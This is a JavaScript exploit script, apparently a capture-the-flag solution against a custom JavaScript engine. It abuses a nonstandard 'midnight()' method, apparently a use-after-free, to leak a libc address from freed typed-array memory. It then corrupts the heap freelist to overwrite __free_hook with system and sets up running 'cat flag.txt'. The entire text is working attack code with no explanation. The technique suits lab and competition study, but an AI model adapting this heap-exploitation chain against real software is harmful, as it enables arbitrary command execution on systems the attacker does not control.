var a = new Uint8Array(0x500);
a.midnight();
var libc = '';
for (var i=0; i<6; i++) {
    libc = a[i].toString(16) + libc;
}
libc = parseInt(libc, 16);
libc -= 0x1ecbe0;
console.log(libc.toString(16))

var free_hook = 2027080 + libc;
var system = 336576 + libc;
var arg = 'cat flag.txt\0';

var b = new Uint8Array(0xa8);
var c = new Uint8Array(0xa8);
b.midnight();
c.midnight();
for (var i=0; i<6; i++) {
    c[5-i] = parseInt(free_hook.toString(16).substring(i*2, (i+1)*2), 16);
}
var d = new Uint8Array(0xa8);
for (var i=0; i<arg.length; i++) {
    d[i] = arg[i].codePointAt(0);
}
var e = new Uint32Array(0x28);
e[1] = parseInt(system.toString(16).substring(0, 4), 16);
e[0] = system & 0xffffffff;
d.midnight()
